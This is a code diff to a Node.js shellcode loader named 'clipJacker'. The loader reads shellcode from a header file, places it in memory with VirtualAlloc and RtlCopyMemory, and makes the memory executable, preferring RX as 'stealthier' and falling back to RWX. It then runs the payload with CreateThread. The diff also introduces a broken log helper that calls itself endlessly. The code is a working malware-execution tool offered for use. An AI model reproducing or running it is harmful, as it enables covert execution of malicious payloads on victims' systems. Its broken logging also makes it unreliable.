@@ -14,14 +14,15 @@ const INFINITE = 0xFFFFFFFF;
 
 function log(level, msg, extra = '') {
   const ts = new Date().toISOString();
-  console.log(`[${ts}] [${level}] ${msg}`, extra);
+  log(`[${ts}] [${level}] ${msg}`, extra);
 }
 
 async function clipJacker(filePath) {
   // ── CONFIG ───────────────────────────────────────────────
   const SHELLCODE_FILE = filePath || './bytes.h';
 
-  console.log(`[+] Reading shellcode from file: ${SHELLCODE_FILE}`);
+  log('INFO', 'Reading shellcode from file', SHELLCODE_FILE);
+
 
   // 1. Read the file content (should contain \xAA\xBB... style C header)
   let rawContent;
@@ -42,7 +43,8 @@ async function clipJacker(filePath) {
     const bytes = matches.map(m => parseInt(m[1], 16));
     const buffer = Buffer.from(bytes);
 
-    console.log(`[+] Successfully parsed ${buffer.length} shellcode bytes`);
+    log('INFO', 'Shellcode parsed', `${buffer.length} bytes`);
+
     return buffer;
   }
 
@@ -77,37 +79,44 @@ async function clipJacker(filePath) {
   const addr = VirtualAlloc(null, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   if (!addr) throw new Error('VirtualAlloc failed');
 
-  console.log('[+] Memory allocated at:', addr);
+ log('INFO', 'Memory allocated', addr);
+
 
   // 4. Copy shellcode
   RtlCopyMemory(addr, shellcode, size);
-  console.log('[+] Shellcode copied into allocated memory');
+  log('INFO', 'Shellcode copied into memory');
+
 
   // 5. Try RX first (stealthier), fallback to RWX
   const oldProtect = Buffer.alloc(4);
   let success = VirtualProtect(addr, size, PAGE_EXECUTE_READ, oldProtect);
 
   if (!success) {
-    console.warn('[-] PAGE_EXECUTE_READ failed → falling back to RWX');
+    log('WARN', 'RX failed, falling back to RWX');
     success = VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, oldProtect);
     if (!success) throw new Error('VirtualProtect failed');
-    console.log('[+] Protection changed to RWX');
+    log('INFO', 'Memory protection set to RWX');
+
   } else {
-    console.log('[+] Protection changed to RX');
+    log('INFO', 'Memory protection set to RX');
+
   }
 
   // 6. Execute in new thread
-  console.log('[+] Launching shellcode thread...');
+  log('INFO', 'Launching shellcode thread');
+
   const threadIdBuf = Buffer.alloc(4);
   const thread = CreateThread(null, 0, addr, null, 0, threadIdBuf);
 
   if (!thread) throw new Error('CreateThread failed');
 
-  console.log('[+] Thread created (ID:', threadIdBuf.readUInt32LE(0), ')');
+  log('INFO', 'Thread created', `ID=${threadIdBuf.readUInt32LE(0)}`);
+
 
   // Wait for thread completion (blocks forever if shellcode doesn't exit)
   await WaitForSingleObject(thread, INFINITE);
-  console.log('[✓] Shellcode execution finished');
+  log('INFO', 'Shellcode execution finished');
+
 }
 
 
@@ -125,5 +134,6 @@ if (args.length > 0) {
   });
 
 }
+
 
 
